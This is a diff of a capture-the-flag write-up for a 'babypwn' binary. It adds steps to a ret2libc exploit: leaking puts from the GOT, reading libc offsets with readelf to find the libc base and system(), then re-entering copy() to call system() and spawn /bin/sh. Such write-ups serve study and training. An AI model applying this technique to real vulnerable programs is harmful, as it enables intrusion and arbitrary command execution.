@@ -28,7 +28,27 @@ puts_got     = 0x403fc8
 
 puts_plt     = 0x401030
 
-This will leak the puts@LIBC address and we can calculate any other function address based on that, in this case system().
+This will leak the puts@LIBC address and we can calculate the offset to any other function address based on that, in this case system().
+
+From their libc:
+
+root@mphx2-VM:/home/mphx2/ctfs/pwnuniversity/babypwn# readelf -s libc.so.6 | grep puts
+
+   194: 0000000000072a40   441 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
+   
+   425: 0000000000072a40   441 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+   
+So the libc base address will be the leaked address (puts@LIBC) - 0x72a40. So the system():
+
+root@mphx2-VM:/home/mphx2/ctfs/pwnuniversity/babypwn# readelf -s libc.so.6 | grep system
+
+   235: 000000000012cc00   104 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@GLIBC_2.2.5
+
+   613: 0000000000045380    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
+  
+  1417: 0000000000045380    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
+
+So the system() will be libc base address + 0x45380.
 
 We need to re-run the application for being able to execute functions again. At first, I tried to use main()=0x401169 but system() could not being executed mostly because the stack/registers were already populated. In the end, It was possible to re-run the scanf() using the function copy()=0x401146 from the binary and use system()+27 for executing /bin/sh.
 
